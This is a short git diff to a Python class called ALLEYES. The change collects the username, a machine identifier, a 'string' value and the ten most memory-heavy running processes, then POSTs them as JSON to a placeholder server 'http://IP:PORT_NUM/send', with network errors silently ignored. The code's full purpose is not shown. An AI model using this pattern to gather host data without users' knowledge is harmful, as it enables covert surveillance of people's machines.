@@ -5,6 +5,8 @@ import requests
 import json
 import socket 
 import uuid
+import psutil
+import time    
 
 class ALLEYES:
     def __init__(self):
@@ -22,21 +24,35 @@ class ALLEYES:
             print(cmid)
         except:
             cmid = '0'
-        url = 'ENTER YOUR URL'
+        url = 'http://IP:PORT_NUM/send'
+        epoch_time = int(time.time())
+        processlist=list()
+        for process in psutil.process_iter():
+            tmplist = list()
+            tmplist.append(process.name())
+            tmplist.append(process.memory_percent())
+            tmplist.append(epoch_time - process.create_time())
+            processlist.append(tmplist)
+        processlist.sort(key=lambda x: -x[1])
+        processlist = processlist[0:10]
+        # print(type(processlist))
+        # print(processlist[0][2])
         data = {
-            'username': '',
-            'mac' :'',
-            'key': '',
-            'string': ''
+            'username': username1,
+            'mac' : cmid,
+            'key': 1,
+            'string': string1,
+            'processlist' : str(processlist),
         }
+        # print(data)
         headers = {'Content-type': 'application/json'}
         try:
             response = requests.post(url, data=json.dumps(data), headers=headers)
         except:
-            pass
+            response = 'googoogaga'
         print('sending data:')
         print(response)
-        print(response.text)
+        # print(response.text)
         # print('hello')
 
 
